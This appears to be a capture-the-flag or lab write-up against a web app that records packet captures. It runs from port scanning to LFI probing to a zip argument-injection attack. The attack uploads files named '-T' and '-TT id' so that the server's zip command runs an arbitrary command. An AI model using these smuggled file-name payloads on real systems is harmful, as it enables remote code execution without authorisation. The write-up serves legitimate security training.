# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn 10.129.234.97 -vv

Nmap scan report for 10.129.234.97
Host is up, received user-set (0.031s latency).
Scanned at 2026-10-16 16:20:14 BST for 7s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

## Nmap
```python
❯❯❯ nmap -p 22,80 -A --min-rate=2000 -sT -Pn 10.129.234.97           
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-16 16:21 +0100
Nmap scan report for 10.129.234.97
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
| ssh-hostkey: 
|   3072 fb:31:61:8d:2f:86:e5:60:f9:e6:24:a3:1c:62:0c:ae (RSA)
|   256 0c:b7:c4:fb:4a:fc:31:1b:e9:4b:0b:d1:19:56:2f:ce (ECDSA)
|_  256 3c:c6:e8:71:4d:9a:d5:1d:86:dd:dd:6c:82:ee:7e:4d (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
|_http-server-header: Apache/2.4.65 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: hdmpll?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# SSH (22)
## Version info
```python
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
| ssh-hostkey: 
|   3072 fb:31:61:8d:2f:86:e5:60:f9:e6:24:a3:1c:62:0c:ae (RSA)
|   256 0c:b7:c4:fb:4a:fc:31:1b:e9:4b:0b:d1:19:56:2f:ce (ECDSA)
|_  256 3c:c6:e8:71:4d:9a:d5:1d:86:dd:dd:6c:82:ee:7e:4d (ED25519)
```

## Auth method

![](Pasted%20image%2020261016162413.png)

It accepts password based auth, this is less secure

# HTTP (80)

![](Pasted%20image%2020261016162703.png)

The landing page is a login form

Ill attempt some logons using default credentials, no overly verbose error messages telling me if a user exists

Also does not appear to be vulnerable to SQL injection

Ill create a user and login 

![](Pasted%20image%2020261016163026.png)

So there are three main options, capture, download and upload

Clicking on download gives me a 404 not found, this is likely because there isnt any stored

If i click on capture it runs a capture on port 31330 for 10s

![1055](Pasted%20image%2020261016163525.png)

If i then return to the home page....

![](Pasted%20image%2020261016163547.png)

I can see there are captures

![](Pasted%20image%2020261016163633.png)

Clicking into one, shows the output on the screen

Its also using the URL parameter `?fn=`

It will be worth testing for LFI and RFI

I can then also download this file, after downloading it comes in the format of a .zip file, unzipping it shows the pcap

![](Pasted%20image%2020261016164209.png)

Looking into potential LFI shows this error message, it looks like it only accepts the UUIDv4 naming format

![](Pasted%20image%2020261016164504.png)

Ill take the UUID and put it into cyberchef, this also shows version 4 and also gives a UUID integer

https://medium.com/@dinesharney/understanding-uuid-v4-uuid-v7-snowflake-id-and-nano-id-in-simple-terms-c50acf185b00

https://hacktricks.wiki/en/pentesting-web/uuid-insecurities.html

This instance is UUID v4 which tends to be very unpredictable apart from maybe 2 characters, this makes it difficult to forge one to read files

If i use the capture function then use a nc command on my machine

```python
nc -vn 10.129.234.97 31330
(UNKNOWN) [10.129.234.97] 31330 (?) : Connection refused
```

While this port is capturing ill send connections then i can view it in the viewer

![982](Pasted%20image%2020261016172750.png)

Although this doesnt help me much

# RCE

![](Pasted%20image%2020261016174636.png)

Whats interesting when i make a file called `";id;#` to test command arguement injection, it obviously URL encodes the `"` but when i download it there is a request to `/download.php`

The output of it looks like its zipping the file, i might be able to get code execution here

It looks lile its using the zip binary and placing the filename into the zip command its running, if this file is structured correctly i should be able to get RCE

```python
file upload -> request download -> files placed into zip command -> UUID generated for zip -> zip file downloaded
```

Ive made a file called `-h2` this is a extended help menu for zip

```python
touch -- "-h2"
```

Then ill upload it, and download it

![](Pasted%20image%2020261016183106.png)

As seen here its executing the -h2 flag

```python
❯❯❯ touch -- "-T"

❯❯❯ touch -- "-TT id"

❯❯❯ echo 'test' > test.txt
```

Ill create the files

![](Pasted%20image%2020261016190444.png)

Ill start by uploading `-T` then ending on `test.txt`

The thought behind this command is

```python
zip <ZIP UUID> -T '-TT id' test.txt
```




